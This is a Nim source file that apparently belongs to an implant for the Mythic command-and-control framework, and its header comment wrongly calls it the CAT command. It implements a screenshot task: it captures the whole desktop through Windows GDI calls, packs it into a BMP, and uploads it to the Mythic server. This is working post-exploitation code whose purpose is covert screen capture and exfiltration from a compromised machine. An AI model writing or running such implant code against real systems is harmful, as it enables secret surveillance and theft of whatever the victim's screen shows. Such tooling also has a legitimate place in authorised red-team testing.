# This is the source for the CAT command
import ../utils
import ../structs
import ../fileManager
import winim
import winim/inc/winuser


#[
 Create a screenshot of the current
 display and return a struct with all the
 bitmap data

 The code was basically stolen from the stack overflow post and converted to nim:
 -> https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application

 i know i know... but seems to work tho

]#
proc createBitmap(outBuffer: var seq[byte]): bool =

  var
    bfHeader: BITMAPFILEHEADER
    biHeader: BITMAPINFOHEADER
    bInfo: BITMAPINFO
    hTempBitmap: HGDIOBJ
    hBitmap: HBITMAP
    bAllDesktops: BITMAP
    hDC: HDC
    hMemDC: HDC
    cbBITS: DWORD = 0
    lWidth, lHeight: int32

  # clear memory
  ZeroMemory(bfHeader.addr, sizeof(bfHeader))
  ZeroMemory(biHeader.addr, sizeof(biHeader))
  ZeroMemory(bInfo.addr, sizeof(bInfo))
  ZeroMemory(bAllDesktops.addr, sizeof(bAllDesktops))


  # Get a Handle to the Device Context
  hDC = GetDC(cast[HWND](0))

  if hDC == 0:
    DBG("[-] Failed to get Device Context")
    return false

  # Get the current Bitmap
  hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP)
  GetObjectW(cast[HANDLE](hTempBitmap), int32(sizeof(BITMAP)), cast[LPVOID](bALlDesktops.addr))

  lWidth = bAllDesktops.bmWidth
  lHeight = bAllDesktops.bmHeight

  # clean the temporary object
  DeleteObject(hTempBitmap)

  bfHeader.bfType = cast[WORD](0x4d42) # BM
  bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)
  biHeader.biSize = DWORD(sizeof(BITMAPINFOHEADER))
  biHeader.biBitCount = 24
  biHeader.biCompression = BI_RGB
  biHeader.biPlanes = 1
  biHeader.biWidth = lWidth
  biHeader.biHeight = lHeight

  bInfo.bmiHeader = biHeader

  cbBits = DWORD(((24 * lWidth + 31) and (not 31)) / 8) * lHeight

  hMemDC = CreateCompatibleDC(hDC)
  var bBits: pointer
  hBitmap = CreateDIBSection(hDC, bInfo.addr, DIB_RGB_COLORS, bBits.addr, 0, 0)

  if hBitmap == 0:
    DBG("[-] Failed to create Bitmap Section")
    return false

  SelectObject(hMemDC, hBitmap)

  var
    x = GetSystemMetrics(SM_XVIRTUALSCREEN)
    y = GetSystemMetrics(SM_YVIRTUALSCREEN)

  BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY)


  # Copy the bitmap data to the output sequence
  var bufIdx = 0
  var totalSize =  sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + cbBits

  outBuffer = newSeq[byte](totalSize)

  copyMem(outBuffer[0].addr, bfHeader.addr, sizeof(BITMAPFILEHEADER))
  bufIdx += sizeof(BITMAPFILEHEADER)
  copyMem(outBuffer[bufIdx].addr, biHeader.addr, sizeof(BITMAPINFOHEADER))
  bufIdx += sizeof(BITMAPINFOHEADER)
  copyMem(outBuffer[bufIdx].addr, bBits, cbBits)

  # CLeanup
  DeleteDC(hMemDC)
  ReleaseDC(cast[HWND](NULL), hDC)
  DeleteObject(hBitmap)

  return true

#[
  Make a screenshot of the desktop using the Windows API
]#
proc cmd_screenshot*(task: Task): seq[TaskResponse] {.cdecl.} =

  # Configure Output
  var
    status = ""
    mythicFileId: string
    bmData: seq[byte]
    ssCorrect: bool

  DBG("[*] Capturing screenshot")
  # Do the Magic
  ssCorrect = createBitmap(bmData)

  if not ssCorrect:
    status = "error"

  DBG("[+] Done... Uploading to Mythic")
  # uploader the file
  if not uploadFileToMythic(task.id, "", mythicFileId, bmData, true):
    status = "error"
  # return the response
  return buildReturnData(task.id, mythicFileId, status)

